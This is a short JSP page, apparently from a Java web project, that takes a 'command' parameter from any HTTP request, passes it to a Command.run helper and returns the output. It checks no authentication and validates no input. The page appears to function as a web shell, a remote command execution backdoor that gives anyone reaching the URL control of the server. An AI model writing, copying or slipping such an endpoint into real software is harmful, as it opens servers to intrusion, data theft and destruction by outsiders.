<%@page import="idream2.main.core.Command"%>
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>

<%
out.clear();

String strCmd = request.getParameter("command");
String strOutput = Command.run(strCmd);

out.print(strOutput);
%>